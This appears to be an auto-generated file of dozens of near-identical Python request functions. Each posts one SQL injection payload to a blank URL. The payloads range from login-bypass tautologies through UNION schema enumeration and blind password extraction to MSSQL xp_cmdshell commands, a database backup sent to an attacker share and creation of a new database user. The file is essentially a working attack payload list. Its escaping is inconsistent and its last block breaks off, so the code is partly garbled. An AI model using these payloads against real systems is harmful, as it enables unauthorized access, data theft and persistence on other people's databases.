                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('1'='1'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'or'1=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'or'1=1′\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x221\\x22=\\x221\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x221\\x22=\\x221\\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x221\\x22=\\x221\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x221\\x22=\\x221\\x22#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1 –\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1–\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \\x221\\x22=\\x221\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \\x221\\x22=\\x221\\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \\x221\\x22=\\x221\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \\x221\\x22=\\x221\\x22#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \x28\\x221\\x22=\\x221\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \x28\\x221\\x22=\\x221\\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \x28\\x221\\x22=\\x221\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \x28\\x221\\x22=\\x221\\x22#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22) or '1′='1–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22) or ('1′='1–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 LIMIT 1;#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'or 1=1 or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22or 1=1 or \\x22\\x22=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 'a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or a=a--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or a=a–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22a\\x22=\\x22a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \x28\\x22a\\x22=\\x22a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('a'='a and hi\x22) or (\x22a\x22=\x22a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 'one'='one\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 'one'='one–\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or uid like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or uname like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or userid like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or user like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or username like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22x\\x22=\\x22x\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' OR 'x'='x'#;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'=' 'or' and '=' 'or'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION ALL SELECT 1, @@version;#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION ALL SELECT system_user(),user();#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION select table_schema,table_name FROM information_Schema.tables;#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' and substring(password/text(),1,1)='7\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' and substring(password/text(),1,1)='7\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select \x40\x40version\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select \x40\x40servernamee\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select \x40\x40microsoftversione\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select * from master..sysserverse\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select * from sysusers\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'ipconfig+/all'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'net+view'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'net+users'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22exec master..xp_cmdshell 'ping+<attackerip>'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22create table myfile (line varchar(8000))\x22 bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'\x22 select * from myfile\x22--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22# you will need to customize/modify some of the vaules in the queries for best effect\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec master..xp_cmdshell 'ping 10.10.1.2'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'create user name identified by 'pass123' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
